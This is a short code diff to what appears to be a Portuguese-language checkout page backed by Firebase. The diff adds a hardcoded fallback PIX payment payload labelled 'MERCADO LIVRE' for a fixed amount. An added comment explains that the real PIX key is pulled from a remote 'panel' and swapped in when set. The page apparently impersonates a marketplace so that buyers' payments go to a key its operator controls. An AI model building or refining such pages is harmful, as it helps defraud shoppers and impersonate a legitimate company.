@@ -767,6 +767,7 @@ INSTRUÇÕES E CUIDADOS: Usar pano levemente umedecido em água ou seco, não us
     const db = firebase.database();
 
     const VALOR_PEDIDO = 416.76;
+    const CHAVE_PIX_FIXA = "00020126580014BR.GOV.BCB.PIX01364db7300a-8df0-46c6-84f1-9946430fcfba5204000053039865406416.765802BR5917MERCADO LIVRE6009SAO PAULO62070503***6304ABCD"; // Substitua pelo seu payload real se precisar
 
     let clienteId = localStorage.getItem('clienteId');
     if (!clienteId) {
@@ -1012,6 +1013,7 @@ INSTRUÇÕES E CUIDADOS: Usar pano levemente umedecido em água ou seco, não us
       msg.style.display = 'block';
       box.style.display = 'none';
 
+      // Aqui ele busca o Pix do painel. Se o painel não tiver atualizado, ele mostra o padrão.
       db.ref('pixConfig').on('value', snap => {
         const cfg = snap.val();
         if (!cfg || !cfg.chave) {
